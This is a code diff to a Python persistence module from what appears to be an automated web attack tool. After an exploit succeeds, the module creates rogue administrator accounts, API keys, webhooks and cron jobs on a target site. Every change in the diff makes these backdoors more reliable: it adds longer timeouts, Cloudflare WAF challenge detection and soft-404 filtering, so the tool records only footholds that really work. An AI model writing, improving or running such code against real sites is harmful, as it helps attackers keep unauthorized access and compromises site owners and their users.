@@ -9,6 +9,8 @@ import logging
 import json
 from typing import Dict, List, Any, Optional
 from .base import PersistenceModule
+from .soft404 import is_soft404
+from .challenge import detect_challenge, note_challenge
 import hashlib
 import time
 
@@ -32,10 +34,14 @@ class PersistenceEngine(PersistenceModule):
         )
         self.backdoors: List[Dict[str, Any]] = []
         self.admin_accounts: List[str] = []
+        self._sig = None   # soft-404 baseline signature from recon
+        self._ctx = None   # AttackContext — set in execute(), used for WAF counters
 
     async def execute(self, context) -> Dict[str, Any]:
         """Execute persistence attacks using exploit results"""
         logger.info(f"[Persist] Starting persistence operations on {context.target_url}")
+        self._sig = getattr(context, "soft404_signature", None)
+        self._ctx = context
 
         # Only attempt if exploit was successful
         if not context.access_granted:
@@ -97,9 +103,18 @@ class PersistenceEngine(PersistenceModule):
                     async with session.post(
                         url,
                         json=payload,
-                        timeout=aiohttp.ClientTimeout(total=5)
+                        timeout=aiohttp.ClientTimeout(total=12)
                     ) as resp:
                         if resp.status in [200, 201]:
+                            body = await resp.text(errors="replace")
+                            if detect_challenge(resp.status, resp.headers, body):
+                                logger.info(f"    ✗ Cloudflare challenge page for {username} — the WAF blocked the request")
+                                note_challenge(self)
+                                continue
+                            if is_soft404(resp.status, body,
+                                          resp.headers.get("Content-Type", ""), self._sig):
+                                logger.info(f"    ✗ Catch-all response for {username} — not a real endpoint")
+                                continue
                             logger.info(f"    ✓ Account created: {username}")
                             self.admin_accounts.append(username)
                             self.backdoors.append({
@@ -137,9 +152,18 @@ class PersistenceEngine(PersistenceModule):
                 async with session.post(
                     url,
                     json=payload,
-                    timeout=aiohttp.ClientTimeout(total=5)
+                    timeout=aiohttp.ClientTimeout(total=12)
                 ) as resp:
                     if resp.status in [200, 201]:
+                        body = await resp.text(errors="replace")
+                        if detect_challenge(resp.status, resp.headers, body):
+                            logger.info("  ✗ Cloudflare challenge page — the WAF blocked the request")
+                            note_challenge(self)
+                            return {"success": False, "method": "api_key"}
+                        if is_soft404(resp.status, body,
+                                      resp.headers.get("Content-Type", ""), self._sig):
+                            logger.info("  ✗ Catch-all response — not a real endpoint")
+                            return {"success": False, "method": "api_key"}
                         logger.info(f"  ✓ API key created: {api_key[:20]}...")
                         self.backdoors.append({
                             "type": "api_key",
@@ -184,9 +208,18 @@ class PersistenceEngine(PersistenceModule):
                     async with session.post(
                         url,
                         json=payload,
-                        timeout=aiohttp.ClientTimeout(total=5)
+                        timeout=aiohttp.ClientTimeout(total=12)
                     ) as resp:
                         if resp.status in [200, 201]:
+                            body = await resp.text(errors="replace")
+                            if detect_challenge(resp.status, resp.headers, body):
+                                logger.info("    ✗ Cloudflare challenge page — the WAF blocked the request")
+                                note_challenge(self)
+                                return {"success": False, "method": "webhook"}
+                            if is_soft404(resp.status, body,
+                                          resp.headers.get("Content-Type", ""), self._sig):
+                                logger.info("    ✗ Catch-all response — not a real endpoint")
+                                return {"success": False, "method": "webhook"}
                             logger.info(f"  ✓ Webhook registered for event: {event}")
                             self.backdoors.append({
                                 "type": "webhook",
@@ -221,9 +254,18 @@ class PersistenceEngine(PersistenceModule):
                 async with session.post(
                     url,
                     json=payload,
-                    timeout=aiohttp.ClientTimeout(total=5)
+                    timeout=aiohttp.ClientTimeout(total=12)
                 ) as resp:
                     if resp.status in [200, 201]:
+                        body = await resp.text(errors="replace")
+                        if detect_challenge(resp.status, resp.headers, body):
+                            logger.info("  ✗ Cloudflare challenge page — the WAF blocked the request")
+                            note_challenge(self)
+                            return {"success": False, "method": "cron"}
+                        if is_soft404(resp.status, body,
+                                      resp.headers.get("Content-Type", ""), self._sig):
+                            logger.info("  ✗ Catch-all response — not a real endpoint")
+                            return {"success": False, "method": "cron"}
                         logger.info(f"  ✓ Cron job scheduled")
                         self.backdoors.append({
                             "type": "cron_job",
